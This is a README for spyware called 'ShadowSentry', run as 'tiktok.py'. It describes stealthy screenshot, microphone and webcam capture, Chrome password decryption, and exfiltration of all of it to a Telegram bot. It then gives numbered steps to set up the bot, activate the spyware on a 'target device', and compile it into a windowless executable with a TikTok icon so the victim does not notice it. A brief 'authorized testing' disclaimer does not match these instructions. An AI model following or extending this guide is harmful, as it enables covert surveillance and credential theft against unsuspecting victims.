# Spyware-pegasus-version1   (🕵️‍♂️ ShadowSentry)

Python
License
Platform
Version

ShadowSentry spyware is a sophisticated ethical hacking system monitoring tool designed for comprehensive surveillance and data collection. It operates stealthily to capture system information, credentials, media, and environmental data, transmitting everything securely to a Telegram bot.


🌟 Features




📸 Media Capture



Screenshot Automation: High-resolution screenshots at regular intervals


Audio Recording: Ambient sound capture with configurable duration


Video Surveillance: Webcam footage recording with MP4 encoding




🔒 Credential Extraction




Chrome password decryption with AES-GCM


Automatic retry mechanism for locked databases


Secure transmission in chunks to bypass message limits




📊 System Intelligence




Comprehensive system information collection


Chunked transmission for large data payloads


Real-time status updates via Telegram





🔐 Security Features





Fernet-encrypted configuration


Secure credential handling


Error-resistant design with comprehensive logging





🛠️ Technical Architecture
Diagram
![Screenshot Placeholder](technical.png)













⚙️ Installation



Prerequisites:


pip install -r requirements.txt

Required packages:

pyautogui


pandas


pywin32


sounddevice


opencv-python


cryptography


requests




Configuration:



Replace the Fernet key in encryption_key


Update encrypted_bot_token and encrypted_chat_id with your Telegram credentials



Customize capture durations in the function calls






🚀 Usage


python tiktok.py



The script will:


Initialize secure communication channels


Create necessary directories (img/, audio/)


Begin automated surveillance cycle:


System information collection


Credential extraction


Periodic media capture






🔄 Operation Cycle
Diagram
![Screenshot Placeholder](operational.png)




🛡️ Security Considerations



All sensitive data is encrypted with AES-256


Telegram communication uses HTTPS


Memory-safe operations for credential handling



Automatic cleanup of temporary files






📜 License


This project is licensed under the MIT License - see the LICENSE file for details.





💌 Contact
For ethical use inquiries or security concerns:

@Illusivehacks


Warning: This tool is intended for authorized penetration testing and educational purposes only. Unauthorized use against systems you don't own or have permission to test is illegal.



Kindly follow the instructions below to create your own spyware successfully

1. Create a folder in your computer in a prefered directory.
2. Open visual studio code and navigate to file to open the folder you have created.
3. Navigate to my github account and access the tiktok.py file and tiktok.ico etc, you can either download them or copy their content.
4. Open the visual studio and create a file by the name "tiktok.py" and paste the code inside the file.
5. Move your downloaded tiktok.ico and all the other files  to the same directory as your tiktok.py file
6. Download the necessary requirements. Navigate to the run nav and select new terminal
   
    Subprocess
    os
    cv2
    time
    pyautogui
    sounddevice
    soundfile
    threading 
    telegrambot
   
    USE THIS COMMAND TO DOWNLOAD THE REQUIREMENTS IN THE TERMINAL ````python -m pip install "requirements.txt"````
   
8. After all requirements are installed, open telegram and search for bot father and id bot to create your bot token and chat id respectively. NOTE: Dont share your bot token and chat id with anyone!!
   now after creating them navigate to the code and paste them to the appropriate sections indicated by comments.
9. Now run the code to check whether the code is working, you can verify it by leaving the code running and opening your telegram and navigate to the bot through the link administered to you after you created the bot. make sure to start your bot.
                

   use the /start command to activate the bot and spyware on the target device at this point the target machine will be your computer coz its currently the one running the code or targets computer.

   All the commands to use will be displayed and now you can execute each one of them from your bot to the target device.

10. Now after verifying that it working you can navigate to the terminal and convert the tiktok.py to an executable using the command below:
    step 1. ````pip install pyinstaller````
    step 2. Create the Executable
            Use the following command to convert your Python script (script.py) into an executable with no console and a custom icon:

            bash
            pyinstaller --noconsole --onefile --icon=path_to_icon.ico tiktok.py
    
    Explanation of the flags:

       --noconsole: Hides the console window when running the executable.
       --onefile: Packages everything into a single .exe file.
       --icon=path_to_icon.ico: Specifies the custom icon for the executable.





🕶️ Keep it stealthy, keep it ethical.
Made with ❤️ (and a bit of 😈) by illusivehacks
